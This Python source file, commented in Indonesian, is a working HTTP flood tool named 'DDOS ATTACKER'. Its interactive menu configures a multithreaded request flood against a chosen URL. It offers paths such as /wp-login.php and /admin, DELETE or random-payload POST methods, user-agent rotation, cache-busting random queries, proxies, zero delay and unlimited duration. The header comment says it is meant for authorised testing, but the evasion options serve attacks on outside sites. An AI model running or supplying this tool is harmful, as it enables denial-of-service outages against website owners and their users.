# -*- coding: utf-8 -*-
# DDOS ATTACKER v1.3.1 (Fix Syntax Error)
# Ingat: Gunakan dengan bijak dan bertanggung jawab!
# Skrip ini ditujukan untuk tujuan edukasi dan pengujian pada sistem milik sendiri
# atau yang diizinkan secara tertulis. Penyalahgunaan adalah ilegal.

import requests
import threading
import time
import os
import sys
import random # Dibutuhkan untuk acak
import string # Dibutuhkan untuk string acak
from urllib.parse import urljoin # Untuk menggabung URL dan path
from threading import Lock, Timer

# --- Import Rich ---
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn, TaskProgressColumn
    from rich import print as rich_print # Gunakan print dari rich
    from rich.rule import Rule # Import Rule untuk garis pemisah
    # Inisialisasi console Rich
    console = Console()
except ImportError:
    # Fallback jika rich tidak ada
    print("Error: Library 'rich' belum terinstal.")
    print("Silakan instal dengan perintah: pip install rich")
    console = None # Tandai console tidak tersedia
    # Definisikan fungsi pengganti sederhana jika rich tidak ada
    def rich_print(*args, **kwargs): print(*args)
    def Panel(text, title="", **kwargs):
        border_len = max(len(str(title)), 40) # Convert title to str for len()
        print(f"\n+{'-' * (border_len + 2)}+")
        if title: print(f"| {str(title).center(border_len)} |") # Convert title to str
        print(f"+{'-' * (border_len + 2)}+")
        for line in str(text).splitlines(): print(f"| {line.ljust(border_len)} |")
        print(f"+{'-' * (border_len + 2)}+")
    class Table:
        def __init__(self, title="", **kwargs): print(f"\n--- {title} ---")
        def add_column(self, *args, **kwargs): pass
        def add_row(self, *args): print(f"- {' : '.join(map(str, args))}")
        def __rich_console__(self, console, options): yield "" # Placeholder untuk rich
    class Progress:
        def __init__(self, *args, **kwargs): self._console_fallback = True
        def add_task(self, *args, **kwargs): return 0 # Dummy task ID
        def update(self, task_id, advance=0, **kwargs):
             global request_counter
             print(f"[Fallback Status] Req: {request_counter}", end='\r') # Print langsung
        def __enter__(self): return self
        def __exit__(self, *args): print()

# Nonaktifkan peringatan InsecureRequestWarning jika menggunakan verify=False
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
except ImportError: pass

# --- Konstanta Warna & Dasar ---
GREEN = '\033[92m'; YELLOW = '\033[93m'; CYAN = '\033[96m'; RED = '\033[91m'
MAGENTA = '\033[95m'; BLUE = '\033[94m'; RESET = '\033[0m'

DEFAULT_TIMEOUT = 10
MAX_THREADS_WARN_THRESHOLD = 500
MAX_RANDOM_DATA_KB = 10240 # 10 MB
MIN_DELAY_WARN = 0.001

# --- Daftar User-Agent ---
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
]

# Metode untuk mode CYCLE
CYCLE_METHODS = ['GET', 'HEAD', 'OPTIONS']

# --- Variabel Global ---
request_counter = 0
counter_lock = Lock()

# --- Fungsi Helper Dasar ---
def clear_screen(): os.system('cls' if os.name == 'nt' else 'clear')
def pause_and_continue():
    if console: console.input(f"\n[yellow]Tekan Enter untuk kembali ke menu utama...[/]")
    else: input(f"\n{YELLOW}Tekan Enter untuk kembali ke menu utama...{RESET}")
def generate_random_string(length=8): return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
def generate_random_bytes(size_in_bytes):
    if size_in_bytes <= 0: return b''
    try:
        if size_in_bytes > 500 * 1024 * 1024: raise MemoryError("Ukuran > 500MB")
        return os.urandom(size_in_bytes)
    except MemoryError as me: rich_print(f"[bold red]Error Memori:[/bold red] {me}"); return None
    except Exception as e: rich_print(f"[bold red]Error membuat data acak:[/bold red] {e}"); return None

# --- Fungsi Banner (Responsif dengan Nama Baru) ---
def display_banner():
    description_text = "[cyan]Simple Network Utility & Stress Tester[/]\n[dim white]v1.3.1 - Modded Version[/]" # Versi diperbarui
    console.print(
        Panel(
            description_text, title="[bold red]DDOS ATTACKER[/]", subtitle="[dim yellow]Use Responsibly![/]",
            style="bold blue", border_style="blue", title_align="center", subtitle_align="center", padding=(1, 5)
        ), justify="center"
     )
    console.print(Rule(style="dim blue"))

# --- Fungsi Worker Thread untuk Serangan (Opsi 1) ---
def serang_server(url, target_path, thread_id, stop_event, method_config, headers_base, post_data, use_random_query, proxies, random_ua_rotation, random_data_size, request_delay, progress, task_id):
    global request_counter
    log_prefix = f"Thread {thread_id}"
    while not stop_event.is_set():
        target_url = url; current_headers = headers_base.copy(); current_post_data = post_data; actual_method = method_config
        base_url = url; current_url = urljoin(base_url, target_path) if target_path else base_url; target_url_loop = current_url
        if random_ua_rotation:
            try: current_headers['User-Agent'] = random.choice(USER_AGENTS)
            except IndexError: pass
        if use_random_query:
            random_param_name = generate_random_string(4); random_param_value = generate_random_string(10)
            separator = '&' if '?' in target_url_loop else '?'; target_url_loop = f"{target_url_loop}{separator}{random_param_name}={random_param_value}"
        if method_config == 'CYCLE':
            actual_method = random.choice(CYCLE_METHODS); current_post_data = None; random_data_size = 0
        if actual_method in ['POST', 'PUT'] and random_data_size > 0:
            current_post_data = generate_random_bytes(random_data_size)
            if current_post_data is None: time.sleep(request_delay + 1.0); continue
        response = None
        try:
            response = requests.request(actual_method, target_url_loop, headers=current_headers, data=current_post_data, timeout=DEFAULT_TIMEOUT, proxies=proxies, stream=True, verify=False)
            response.raise_for_status()
            with counter_lock: request_counter += 1
            if progress and task_id is not None: progress.update(task_id, advance=1)
        except requests.exceptions.RequestException: pass
        except Exception: pass
        finally:
            if response: response.close()
        try:
            actual_delay = request_delay + random.uniform(0, request_delay * 0.1)
            if actual_delay > 0: time.sleep(actual_delay)
        except Exception: pass

# --- Fungsi Menu & Starter Serangan (Opsi 1) ---
def start_attack_menu():
    """Menangani input konfigurasi serangan dengan validasi & UI Rich."""
    clear_screen()
    if not console: print(f"{RED}Error: Gagal menggunakan Rich Console.{RESET}"); return

    console.print(Panel("[bold cyan]Opsi 1: Mulai Serangan / Uji Beban (Advanced)[/]", title="Konfigurasi Serangan", border_style="blue"))
    console.print("[yellow]Tips: Isi hati-hati. Pengaturan ekstrim bisa lambat/error.[/]")

    config = { 'url': "", 'target_path': "/", 'jumlah_thread': 50, 'attack_method': 'GET', 'post_data': None, 'random_data_size': 0, 'custom_headers': {}, 'random_ua_rotation': False, 'attack_duration': 0, 'use_random_query': False, 'proxies': None, 'request_delay': 0.05, 'proxy_input': "" }
    custom_ua_input = ""
    steps = { 1: "URL Target", 2: "Target Path", 3: "Jumlah Thread", 4: "Metode HTTP & Data", 5: "User-Agent", 6: "Durasi", 7: "Query Acak", 8: "Proxy", 9: "Delay" }
    current_step = 1; max_steps = len(steps)

    while current_step <= max_steps:
        # (Kode input step 1-9 sama seperti jawaban sebelumnya, termasuk menu path di step 2 dan menu metode di step 4)
        # ... (Salin lengkap logika input while loop dari jawaban sebelumnya) ...
        step_name = steps[current_step]
        prompt_prefix = f"[yellow]{current_step}. {step_name}[/]"
        try:
            if current_step == 1: # URL
                url_input = console.input(f"{prompt_prefix} (http/https): ").strip()
                if url_input.startswith("https://"): console.print("[italic yellow]   Info: Target HTTPS lebih berat.[/]")
                if url_input.startswith(("http://", "https://")): config['url'] = url_input; current_step += 1
                else: console.print(f"[red]Format URL salah.[/]")
            elif current_step == 2: # Target Path (dengan Pilihan)
                console.print(Rule(f"[bold yellow]{current_step}. Pilih Target Path[/]", style="yellow"))
                path_options = {'1': ("/", "Root - Halaman Utama"),'2': ("/login", "Halaman Login Umum"),'3': ("/admin", "Area Admin Umum"),'4': ("/register", "Halaman Registrasi"),'5': ("/api/", "Endpoint API Umum"),'6': ("/wp-login.php", "Login WordPress"),}
                custom_option_key = str(len(path_options) + 1)
                for key, (path_val, desc) in path_options.items(): console.print(f"  [[bold cyan]{key}[/]] {path_val:<15} - {desc}")
                console.print(f"  [[bold cyan]{custom_option_key}[/]] {'Masukkan path kustom...':<15}")
                while True:
                    choice = console.input(f"[yellow]Pilihan (1-{custom_option_key}) atau ketik path kustom diawali '/': [/]").strip()
                    if choice.isdigit() and choice in path_options: config['target_path'] = path_options[choice][0]; console.print(f"[green]   -> Path dipilih: {config['target_path']}[/]"); current_step += 1; break
                    elif choice == custom_option_key:
                         custom_path_input = console.input("[yellow]   Masukkan path kustom (diawali '/'): [/]").strip()
                         if custom_path_input.startswith('/'): config['target_path'] = custom_path_input; console.print(f"[green]   -> Path kustom dipilih: {config['target_path']}[/]"); current_step += 1; break
                         else: console.print("[red]   Path kustom harus diawali '/'. Coba lagi.[/]")
                    elif choice.startswith('/'): config['target_path'] = choice; console.print(f"[green]   -> Path kustom dipilih: {config['target_path']}[/]"); current_step += 1; break
                    else: console.print(f"[red]Input tidak valid.[/]")
            elif current_step == 3: # Threads
                th_str = console.input(f"{prompt_prefix} (> 0, saran < {MAX_THREADS_WARN_THRESHOLD}) [{config['jumlah_thread']}]: ") or str(config['jumlah_thread'])
                th_val = int(th_str); config['jumlah_thread'] = th_val
                if th_val <= 0: console.print(f"[red]Jumlah > 0.[/]")
                else:
                    if th_val > MAX_THREADS_WARN_THRESHOLD: console.print(f"[yellow]   Peringatan: {th_val} thread mungkin berat.[/]")
                    current_step += 1
            elif current_step == 4: # Metode HTTP & Data
                console.print(Rule(f"[bold yellow]{current_step}. Pilih Metode HTTP[/]", style="yellow"))
                method_options = {'GET': "Mengambil data (Default, spt buka halaman)", 'POST': "Mengirim data (Spt submit form)", 'HEAD': "Mengambil header saja", 'PUT': "Mengganti/Upload resource (Perlu data)", 'DELETE': "Menghapus resource (Hati-hati!)", 'OPTIONS': "Mengecek opsi server", 'CYCLE': "[bold white]Acak GET, HEAD, OPTIONS[/]"}
                valid_methods = list(method_options.keys())
                for key, desc in method_options.items(): console.print(f"  - [bold cyan]{key:<8}[/]: {desc}")
                while True:
                    m_choice = console.input(f"[yellow]Pilih metode [GET]:[/] ").upper() or 'GET'
                    if m_choice in valid_methods:
                        config['attack_method'] = m_choice; config['post_data'] = None; config['random_data_size'] = 0
                        if config['attack_method'] == 'CYCLE': console.print(f"[green]   Mode Cycle dipilih.[/]")
                        elif config['attack_method'] in ['POST', 'PUT']:
                            d_choice = console.input(f"[yellow]   Data acak (r) atau tetap (f)? [f]: ").lower() or 'f'
                            if d_choice == 'r':
                                while True:
                                    size_str = console.input(f"[yellow]   Ukuran data acak (KB, maks: {MAX_RANDOM_DATA_KB}):[/] ")
                                    try:
                                        size_kb = float(size_str)
                                        if 0 < size_kb <= MAX_RANDOM_DATA_KB: config['random_data_size'] = int(size_kb * 1024); break
                                        else: console.print(f"[red]Ukuran > 0 & <= {MAX_RANDOM_DATA_KB} KB.[/]")
                                    except ValueError: console.print(f"[red]Input angka tidak valid.[/]")
                            else: config['post_data'] = console.input(f"[yellow]   Masukkan data tetap {config['attack_method']}:[/] ")
                        current_step += 1; break
                    else: console.print(f"[red]Metode tidak valid.[/]")
            elif current_step == 5: # User-Agent
                ua_c = console.input(f"{prompt_prefix} Acak (y/n)? [n]: ").lower() or 'n'
                if ua_c == 'y': config['random_ua_rotation'] = True; console.print("[green]   User-Agent akan diacak.[/]")
                else: config['random_ua_rotation'] = False; custom_ua_input = console.input(f"[yellow]   User-Agent kustom (kosong=default): [/]")
                current_step += 1
            elif current_step == 6: # Durasi
                dur_str = console.input(f"{prompt_prefix} (detik, 0=tak terbatas) [{config['attack_duration']}]: ") or str(config['attack_duration'])
                dur_val = int(dur_str); config['attack_duration'] = dur_val
                if dur_val < 0: console.print(f"[red]Durasi >= 0.[/]")
                else: current_step += 1
            elif current_step == 7: # Query Acak
                q_c = console.input(f"{prompt_prefix} (?cache=xxx)? (y/n) [n]: ").lower() or 'n'
                config['use_random_query'] = (q_c == 'y'); current_step += 1
            elif current_step == 8: # Proxy
                 while True:
                    p_input = console.input(f"{prompt_prefix} (contoh: http://host:port) [kosong=tidak]: ").strip()
                    config['proxy_input'] = p_input
                    if not p_input: config['proxies'] = None; break
                    if '://' in p_input and ':' in p_input.split('://')[1]: config['proxies'] = {'http': p_input, 'https': p_input}; break
                    else: console.print(f"[red]Format proxy salah.[/]")
                 current_step += 1
            elif current_step == 9: # Delay
                 while True:
                    d_str = console.input(f"{prompt_prefix} (detik) [{config['request_delay']}]: ") or str(config['request_delay'])
                    d_val = float(d_str); config['request_delay'] = d_val
                    if d_val == 0:
                        console.print(f"[bold red]   PERINGATAN KERAS: Delay 0 SANGAT TIDAK DISARANKAN![/]")
                        cz = console.input(f"[yellow]   Yakin pakai delay 0? (y/n): [/]").lower()
                        if cz == 'y': break
                        else: continue
                    elif d_val < 0: console.print(f"[red]Delay >= 0.[/]")
                    else: break
                 current_step += 1

        except ValueError: console.print(f"[red]Input angka tidak valid. Coba lagi.[/]")
        except KeyboardInterrupt: rich_print("\n[bold yellow]Input dibatalkan.[/]"); return
        except Exception as e: rich_print(f"[bold red]Error input: {e}[/]"); return

    # --- Set Header Dasar ---
    if custom_ua_input: config['custom_headers']['User-Agent'] = custom_ua_input
    elif not config['random_ua_rotation']: config['custom_headers']['User-Agent'] = USER_AGENTS[0]

    # --- Konfirmasi (Rich Table) ---
    clear_screen(); table = Table(title="Konfirmasi Konfigurasi Serangan", border_style="green", show_header=False, padding=(0,1))
    table.add_column("Parameter", style="cyan", no_wrap=True); table.add_column("Nilai", style="white")
    table.add_row("URL Target", config['url']); table.add_row("Target Path", config['target_path']); table.add_row("Jumlah Thread", str(config['jumlah_thread']))
    if config['attack_method'] == 'CYCLE': table.add_row("Metode HTTP", "[bold white]CYCLE[/] (Acak GET/HEAD/OPTIONS)")
    else: table.add_row("Metode HTTP", config['attack_method'])
    if config['random_data_size'] > 0: table.add_row(f"Data {config['attack_method']}", f"[cyan]Acak ({config['random_data_size']/1024:.1f} KB)[/]")
    elif config['post_data'] is not None: table.add_row(f"Data {config['attack_method']}", f"Tetap ({len(config['post_data'])} bytes)")
    if config['random_ua_rotation']: table.add_row("User-Agent", "[cyan]Diacak[/]")
    else: table.add_row("User-Agent", config['custom_headers'].get('User-Agent', 'Default'))
    table.add_row("Durasi", 'Tak terbatas' if config['attack_duration'] == 0 else f"{config['attack_duration']} detik")
    table.add_row("Query Acak", 'Ya' if config['use_random_query'] else 'Tidak')
    table.add_row("Proxy", config['proxy_input'] if config['proxy_input'] else 'Tidak')
    table.add_row("Request Delay/thr", f"{config['request_delay']:.3f} detik")
    console.print(table)

    # --- Konfirmasi Akhir ---
    while True:
        try: konfirmasi = console.input(f"[bold yellow]\nMulai proses? (y/n):[/] ").lower()
        except KeyboardInterrupt: rich_print("\n[yellow]Proses dibatalkan.[/]"); return
        if konfirmasi == 'y': break
        elif konfirmasi == 'n': rich_print("[yellow]Proses dibatalkan.[/]"); return
        else: rich_print(f"[red]Pilihan tidak valid.[/]")

    # --- Mulai Proses Serangan dengan Rich Progress ---
    rich_print(f"\n[yellow]Memulai {config['jumlah_thread']} thread ({config['attack_method']}) ke {config['url']}{config['target_path']}...[/]")
    if config['attack_duration'] > 0: rich_print(f"[yellow]Akan berhenti setelah ~{config['attack_duration']} detik.[/]")
    rich_print(f"[yellow]Tekan Ctrl+C untuk menghentikan lebih awal.[/]")

    threads = []; stop_event = threading.Event(); timer = None; attack_start_time = time.time()

    # ===========================================================
    # === PERBAIKAN ERROR SYNTAX DI BAGIAN RESET COUNTER ========
    # ===========================================================
    global request_counter # Deklarasi global
    with counter_lock:   # Blok with di baris terpisah
        request_counter = 0 # Reset counter di dalam lock
    # ===========================================================
    # ===========================================================


    progress_columns = [SpinnerColumn(),TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("Req: [bold blue]{task.completed:.0f}[/]")]
    if config['attack_duration'] > 0: progress_columns.append(TimeRemainingColumn())
    progress = Progress(*progress_columns, console=console, transient=True, refresh_per_second=15)

    try:
        with progress:
            path_display = f"{config['target_path']}" if config['target_path'] != "/" else "/"
            url_display = config['url'].split('//')[-1].split('/')[0]
            desc = f"Attacking [link={config['url']}]{url_display}[/link]{path_display} ({config['attack_method']})"
            task_id = progress.add_task(desc, total=None, start=True)

            if config['attack_duration'] > 0:
                def time_limit_reached():
                    if not stop_event.is_set(): stop_event.set()
                timer = Timer(config['attack_duration'], time_limit_reached); timer.daemon = True; timer.start()

            for i in range(config['jumlah_thread']):
                if stop_event.is_set(): break
                thread = threading.Thread(target=serang_server, args=(config['url'], config['target_path'], i + 1, stop_event, config['attack_method'], config['custom_headers'], config['post_data'], config['use_random_query'], config['proxies'], config['random_ua_rotation'], config['random_data_size'], config['request_delay'], progress, task_id), daemon=True)
                threads.append(thread); thread.start()
                time.sleep(max(0.001, 0.1 / (config['jumlah_thread'] + 1)))

            while not stop_event.is_set():
                 if config['jumlah_thread'] > 0 and not any(t.is_alive() for t in threads):
                     if not stop_event.is_set(): stop_event.set(); break
                 time.sleep(0.2)

    except KeyboardInterrupt: rich_print(f"\n[bold yellow]Ctrl+C. Menghentikan...[/]")
    except Exception as e: rich_print(f"\n[bold red]Error utama: {e}[/]")
    finally:
        if not stop_event.is_set(): stop_event.set()
        if timer and timer.is_alive(): timer.cancel()
        time.sleep(0.2)
        with counter_lock: final_count = request_counter
        console.print(Panel(f"[bold green]Proses serangan dihentikan.[/]\n[cyan]Total request terkirim (approx): {final_count}[/]", title="Selesai", border_style="green"))
        pause_and_continue()

# --- Fungsi Opsi Menu 2: Cek Status URL Tunggal ---
def check_url_status():
    """Memeriksa status satu URL menggunakan Rich."""
    clear_screen(); console.print(Panel("[bold cyan]Opsi 2: Cek Status URL Tunggal[/]", title="Cek Status", border_style="blue"))
    url = console.input(f"[yellow]Masukkan URL (http/https):[/] ").strip()
    if not (url.startswith("http://") or url.startswith("https://")): rich_print(f"[red]Format URL tidak valid.[/]"); pause_and_continue(); return
    try:
        with console.status(f"[yellow]Mengecek {url}...[/]", spinner="dots") as status:
            start_time = time.time(); headers = {'User-Agent': random.choice(USER_AGENTS)}; response = requests.get(url, timeout=DEFAULT_TIMEOUT, headers=headers, allow_redirects=True, verify=False)
            end_time = time.time(); elapsed_time = end_time - start_time; response.raise_for_status()
        status.stop(); table = Table(title="Hasil Cek Status", border_style="green", show_header=False, padding=(0,1))
        table.add_column("Item", style="cyan", no_wrap=True); table.add_column("Nilai", style="white")
        table.add_row("URL Final", response.url); table.add_row("Status Code", f"[bold green]{response.status_code} ({response.reason})[/]")
        table.add_row("Waktu Respons", f"{elapsed_time:.3f} dtk")
        try: content_length = int(response.headers.get('Content-Length', 'N/A'))
        except (ValueError, TypeError): content_length = len(response.content) if response.content else 'N/A'
        table.add_row("Ukuran Konten", f"{content_length} bytes"); table.add_row("Server", response.headers.get('Server', 'N/A'))
        console.print(table)
    except requests.exceptions.Timeout: rich_print(f"\n[red]Error: Request timeout.[/]")
    except requests.exceptions.TooManyRedirects: rich_print(f"\n[red]Error: Terlalu banyak redirect.[/]")
    except requests.exceptions.RequestException as e: rich_print(f"\n[red]Error Request: {type(e).__name__} (Status: {getattr(e.response, 'status_code', 'N/A')})[/]")
    except Exception as e: rich_print(f"\n[red]Error tak terduga: {e}[/]")
    pause_and_continue()

# --- Fungsi Opsi Menu 3: Lihat Header URL ---
def view_url_headers():
    """Mengambil dan menampilkan header HTTP menggunakan Rich."""
    clear_screen(); console.print(Panel("[bold cyan]Opsi 3: Lihat Header URL[/]", title="Lihat Header", border_style="blue"))
    url = console.input(f"[yellow]Masukkan URL (http/https):[/] ").strip()
    if not (url.startswith("http://") or url.startswith("https://")): rich_print(f"[red]Format URL tidak valid.[/]"); pause_and_continue(); return
    try:
         with console.status(f"[yellow]Mengambil header dari {url}...[/]", spinner="dots") as status:
            headers_req = {'User-Agent': random.choice(USER_AGENTS)}; method_used = "HEAD"
            try: response = requests.head(url, timeout=DEFAULT_TIMEOUT, headers=headers_req, allow_redirects=True, verify=False); response.raise_for_status()
            except requests.exceptions.RequestException:
                status.update(f"[yellow]HEAD gagal, mencoba GET untuk {url}...[/]")
                response = requests.get(url, timeout=DEFAULT_TIMEOUT, headers=headers_req, allow_redirects=True, verify=False, stream=True); response.raise_for_status(); method_used = "GET"
            status.stop(); table = Table(title=f"Header Respons dari {response.url} (via {method_used})", border_style="green", show_header=True, header_style="bold blue", padding=(0,1))
            table.add_column("Header Key", style="cyan", no_wrap=True); table.add_column("Header Value", style="white")
            if response.headers:
                for key, value in response.headers.items(): table.add_row(key, value)
            else: table.add_row("(No headers received)", "")
            console.print(f"Status Code: [bold green]{response.status_code} ({response.reason})[/]"); console.print(table)
            if hasattr(response, 'close'): response.close()
    except requests.exceptions.Timeout: rich_print(f"\n[red]Error: Request timeout.[/]")
    except requests.exceptions.TooManyRedirects: rich_print(f"\n[red]Error: Terlalu banyak redirect.[/]")
    except requests.exceptions.RequestException as e: rich_print(f"\n[red]Error Request: {type(e).__name__} (Status: {getattr(e.response, 'status_code', 'N/A')})[/]")
    except Exception as e: rich_print(f"\n[red]Error tak terduga: {e}[/]")
    pause_and_continue()

# --- Fungsi Menu Utama (Versi Rich - Perbaikan Final) ---
def display_main_menu():
    """Menampilkan menu utama menggunakan Rich."""
    clear_screen(); display_banner()
    try: current_time_info = time.strftime("%a, %d %b %Y, %H:%M:%S %Z", time.localtime()); console.print(f"[dim yellow]Lokasi: Jakarta, Indonesia | Waktu: {current_time_info}[/]", justify="center")
    except Exception: console.print("[yellow]Jakarta, Indonesia[/]", justify="center")
    menu_text = ("1. Mulai Serangan / Uji Beban [cyan](Advanced)[/]\n2. Cek Status URL Tunggal\n3. Lihat Header URL\n4. [red]Keluar[/]")
    console.print(Panel(menu_text, title="[bold green]MENU UTAMA[/]", border_style="green", padding=(1, 5)))
    while True:
        try:
            pilihan = console.input(f"[bold yellow]Masukkan pilihan Anda (1-4):[/] ")
            if pilihan in ['1', '2', '3', '4']: return pilihan
            else: rich_print(f"[red]Pilihan tidak valid.[/]")
        except KeyboardInterrupt: rich_print("\n[bold yellow]Ctrl+C terdeteksi. Keluar...[/]"); return '4'
        except Exception as e: rich_print(f"[bold red]Error input: {e}[/]"); return '4'

# --- Loop Program Utama ---
def main():
    """Loop utama program."""
    while True:
        choice = display_main_menu()
        if choice == '1': start_attack_menu()
        elif choice == '2': check_url_status()
        elif choice == '3': view_url_headers()
        elif choice == '4': rich_print("\n[bold green]Terima kasih! Sampai jumpa![/]"); sys.exit()

# --- Titik Masuk Program ---
if __name__ == "__main__":
    modules_ok = True
    try: import requests
    except ImportError: print(f"\n{RED}Error: Library 'requests' belum terinstal.{RESET}\n{YELLOW}Jalankan: pip install requests{RESET}"); modules_ok = False
    if not console: # Cek console rich dari awal
        print(f"\n{RED}Error: Library 'rich' gagal diimport atau tidak ditemukan.{RESET}\n{YELLOW}Pastikan sudah terinstal dengan benar: pip install rich{RESET}"); modules_ok = False
    if modules_ok: main()
    else: sys.exit(1)